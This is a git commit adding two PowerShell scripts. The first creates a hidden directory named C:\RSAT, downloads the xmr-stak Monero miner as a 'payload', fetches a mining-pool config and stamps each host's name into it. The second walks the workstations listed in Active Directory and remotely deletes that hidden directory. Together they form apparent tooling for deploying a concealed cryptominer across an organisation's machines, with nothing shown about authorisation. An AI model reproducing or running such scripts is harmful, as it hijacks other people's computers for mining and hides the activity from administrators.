cb34ea6c3af01ba2140759717c94f8029c99e538
velvet-valdes <valdestr@gmail.com>
2018-04-06 16:05:57 -0400

    Initial Workings
    Setup& Break Down

---
+++ advanceParty.ps1
@@ -0,0 +1,71 @@
+﻿# advanceParty - setup fireBase for fireMissions - because an advance party don't stop!
+
+# Create an operations directory and hide it
+$opsDirectory = "C:\RSAT"
+If(!(test-path $opsDirectory))
+    {
+
+        mkdir $opsDirectory
+        $f=get-item $opsDirectory -Force
+        $f.attributes="Hidden"
+    }
+
+# Check to see if our payload is already downloaded. Note we need to
+# specify our TLS version to 1.2 to get the download to negoatiate
+# a secure channel.
+
+$payload = "$opsDirectory\payload.zip"
+
+If(!(test-path $payload))
+
+    {
+
+    $url = "https://github.com/fireice-uk/xmr-stak/releases/download/2.4.2/xmr-stak-win64.zip"
+    $start_time = Get-Date
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $url -OutFile $payload
+    Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
+
+    }
+
+# Check to see if our config is already downloaded. Note we need to
+# specify our TLS version to 1.2 to get the download to negoatiate
+# a secure channel.
+
+$config = "$opsDirectory\config.zip"
+
+If(!(test-path $config))
+
+    {
+
+    $url = "https://github.com/velvet-valdes/dump/releases/download/v0.1-alpha/dump.zip"
+    $start_time = Get-Date
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $url -OutFile $config
+    Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
+
+    }
+
+# Unzip contents of file and remove payload
+Expand-Archive -LiteralPath $payload -DestinationPath $opsDirectory
+rm $payload
+
+# Load the newly unzipped directory path into a variable
+# and set the destiation path to extract the config
+
+$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
+$stakDir = "$opsDirectory\$unzipDir"
+
+# Unzip contents of file and remove configuration
+Expand-Archive -LiteralPath $config -DestinationPath $stakDir
+rm $config
+
+# Modify the contents of the configuration files to change the hardcoded variable
+# in downloaded configs to the hostname of the machine
+
+(get-content "$stakDir\pools.txt") | foreach-object {$_ -replace "REDLEG", "$env:COMPUTERNAME"} | set-content "$stakDir\pools.txt"
+
+# Quick hack for user input to keep window open
+Read-Host -Prompt "Press Enter to exit"
---
+++ moveOut.ps1
@@ -0,0 +1,22 @@
+﻿# Get the workstations in the active computers OU and filter out the weirdos. Store them in a host list.
+$HostList=(Get-ADComputer -Filter "Name -like 'wkst*'" -SearchBase "OU=Active Computers, DC=camthebull, DC=net").name
+
+# Cycle through the clients in the host list and recursively remove the operations directory
+$opsDir = "C:\RSAT"
+
+foreach($client in $HostList )
+{
+    
+    write-host "Sending command to.. $client"
+    $cmdstring = "invoke-command -computername $client -scriptblock {write-host $client 'MOVING OUT!' ; Remove-Item -path $opsDir -Recurse -Force}"
+    $scriptblock = [scriptblock]::Create($cmdstring)
+
+    start-process powershell -argumentlist "-noexit -command $Scriptblock"
+
+}
+
+# Prompt user to close windows
+Read-Host -Prompt "Press Enter to exit all other shells"
+
+# Close all open powershell windows other than this one
+Get-Process -Name powershell | Where-Object -FilterScript {$_.Id -ne $PID} | Stop-Process -PassThru
